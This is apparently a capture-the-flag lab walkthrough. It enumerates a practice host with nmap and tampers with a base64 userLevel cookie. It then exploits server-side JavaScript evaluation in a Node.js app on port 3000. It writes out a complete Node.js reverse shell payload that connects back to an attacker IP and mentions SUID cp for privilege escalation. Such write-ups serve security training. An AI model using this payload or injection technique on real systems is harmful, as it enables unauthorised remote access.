First we start with nmap scan

`nmap -p- --min-rate 10000 -oN fulltcp.txt -v 192.168.108.110`

```
# Nmap 7.93 scan initiated Thu Dec 29 10:18:40 2022 as: nmap -p- --min-rate 10000 -oN fulltcp.txt -v 192.168.108.110
Nmap scan report for 192.168.108.110
Host is up (0.20s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
3000/tcp  open  ppp
27017/tcp open  mongod

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Dec 29 10:19:21 2022 -- 1 IP address (1 host up) scanned in 41.77 seconds
```

Got few ports open, let's run nmap script to know the services running on these ports.

```
# Nmap 7.93 scan initiated Thu Dec 29 10:23:33 2022 as: nmap -sC -sV -oN normal.tcp -p 21,22,80,3000,27017 -Pn 192.168.108.110                                        
Nmap scan report for 192.168.108.110                                               
Host is up (0.30s latency).                                                        
                                                                                   
PORT      STATE SERVICE VERSION                                                                                                                                       
21/tcp    open  ftp     vsftpd 3.0.3                                                                                                                                  
| ftp-syst:                                                                        
|   STAT:                                                                                                                                                             
| FTP server status:                                                               
|      Connected to 192.168.49.108                                                                                                                                    
|      Logged in as ftp                                                            
|      TYPE: ASCII                                                                                                                                                    
|      No session bandwidth limit                                                                                                                                     
|      Session timeout in seconds is 300                                                                                                                              
|      Control connection is plain text                                                                                                                               
|      Data connections will be plain text                                         
|      At session startup, client count was 2                                                                                                                         
|      vsFTPd 3.0.3 - secure, fast, stable                                                                                                                            
|_End of status                                                                    
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                             
|_Can't get directory listing: TIMEOUT                                                                                                                                
22/tcp    open  ssh     OpenSSH 8.3 (protocol 2.0)                                 
| ssh-hostkey:                                                                     
|   3072 9d3feb1baa9c1eb1309b23534bcf5975 (RSA)                                    
|   256 cddc05e6e3bb1233f7097450128a8564 (ECDSA)                                   
|_  256 a0901f5078b39e412a7f5c6f4d0ea1fa (ED25519)                                 
80/tcp    open  http    Apache httpd 2.4.46 ((Fedora))                             
| http-robots.txt: 22 disallowed entries (15 shown)                                                                                                                   
| /core/ /profiles/ /README.txt /web.config /admin/                                
| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/                                                                                                    
| /user/password/ /user/login/ /user/logout/ /index.php/admin/                     
|_/index.php/comment/reply/                                                        
|_http-server-header: Apache/2.4.46 (Fedora)                                                                                                                          
|_http-generator: Drupal 9 (https://www.drupal.org)                                                                                                                   
|_http-title: Home | Hacking Articles                                              
3000/tcp  open  http    Node.js (Express middleware)                                                                                                                  
|_http-title: Site doesn't have a title (text/html; charset=utf-8). 
27017/tcp open  mongodb MongoDB 4.2.9                                                                                                                                 
| mongodb-info:                                                                                                                                                       
|   MongoDB Build info                                                             
|     gitVersion = 06402114114ffc5146fd4b55402c96f1dc9ec4b5                        
|     bits = 64                                                                    
|     sysInfo = deprecated                                                                                                                                            
|     allocator = tcmalloc                                                                                                                                            
|     buildEnvironment                                                             
|       target_os = linux                                                                                                                                             
|       ccflags = -fno-omit-frame-pointer -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -Werror -O2 -Wno-unused-local-ty
pedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-const-variable -Wno-unused-but-set-variable -Wno-missing-braces -fstack-protector-strong -fno-bui
ltin-memcmp                                                                        
|       distmod = rhel70                                                                                                                                              
|       cxxflags = -Woverloaded-virtual -Wno-maybe-uninitialized -fsized-deallocation -std=c++17                                                                      
|       cc = /opt/mongodbtoolchain/v3/bin/gcc: gcc (GCC) 8.2.0                                                                                                        
|       target_arch = x86_64                                                                                                                                          
|       cxx = /opt/mongodbtoolchain/v3/bin/g++: g++ (GCC) 8.2.0                    
|       linkflags = -pthread -Wl,-z,now -rdynamic -Wl,--fatal-warnings -fstack-protector-strong -fuse-ld=gold -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -
Wl,--warn-execstack -Wl,-z,relro.
| mongodb-databases: 
|   ok = 1.0
|   totalSize = 307200.0
|   databases
|     0
|       name = account-app
|       sizeOnDisk = 131072.0
|       empty = false
|     3
|       name = local
|       sizeOnDisk = 73728.0
|       empty = false
|     2
|       name = config
|       sizeOnDisk = 61440.0
|       empty = false
|     1
|       name = admin
|       sizeOnDisk = 40960.0
|_      empty = false
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 29 10:24:30 2022 -- 1 IP address (1 host up) scanned in 56.71 seconds
```

After much enum done on port 21, 80. i got nothing so i decide to enumerate port 3000 http node.js.

![image](https://user-images.githubusercontent.com/87468669/209940567-572bbc8c-5f02-452f-91f7-1c5be7e944a0.png)

Got to see what is running on the web server. checking the source page got nothing, so i created an acct.

![image](https://user-images.githubusercontent.com/87468669/209940799-ba896ea4-4571-48f1-9ebb-709a2f5b9914.png)

create an acct and hit register button and login.

![image](https://user-images.githubusercontent.com/87468669/209941501-d6ec5e4d-af89-4122-8199-e3ad7dc42520.png)

go to eventlogs, which allows users to create tickets so i tried to create a ticket as a regular user and intercepted the request using burp.

![image](https://user-images.githubusercontent.com/87468669/209942562-7dcfa340-520d-4bc3-a649-213fc86ba97d.png)

I noticed there are 4 interesting parameters: (conenct.sid cookie, userLevel that has a base64 value which was decoded to default, username and msg )

![image](https://user-images.githubusercontent.com/87468669/209942978-139e1840-742c-456d-a598-720c153a65e4.png)

I change the value of userlevel: to admin in base64 and Then, I tried passing encoded arithmetic operations like 3*3 in the parameters to see if the application would evaluate them.

![image](https://user-images.githubusercontent.com/87468669/209943175-c656917d-1fc6-4a5a-8d64-ae196f0e5593.png)

Bull's eye we got evaluation for the arthimetic operation. Now, we have identified that the application executes JavaScript code on the back-end, it is time to weaponize it. We will use a NodeJS reverse shell and see if we get a connection back to our machine. The code below creates a function that calls the JS child_process module with the require function, creating new child processes of the main Node.js process.

Then it uses the spawn function to pass the shell commands; in our case is a bash shell that gets executed in the newly created child processes. And, finally, it creates a new connection with the port number and IP address of the attacking machine and piping the shell’s stdin (input) and piping out the client’s output (stdout).

```
(function(){     
 var net = require("net"),         
       cp = require("child_process"),         
       sh = cp.spawn("/bin/bash", []);     
  var client = new net.Socket();
 
  //create connection to the attacking machine
  client.connect(80, "192.168.49.243", function(){         
      client.pipe(sh.stdin);         
      sh.stdout.pipe(client);        
      sh.stderr.pipe(client); 
  });     
  return /a/; 
})()%
```

![image](https://user-images.githubusercontent.com/87468669/209944576-2ef1ab90-e437-4781-9cfe-23ea1e1f376d.png)

Send the payload in url encoding, and Boom got shell as user benjamin.

![image](https://user-images.githubusercontent.com/87468669/209944899-aba89f8f-73d0-4748-9c8f-e5088e73a3f2.png)

Stabilize the shell and check for suid, `/usr/bin/cp` is an suid bin, so let's excalate privs with it.




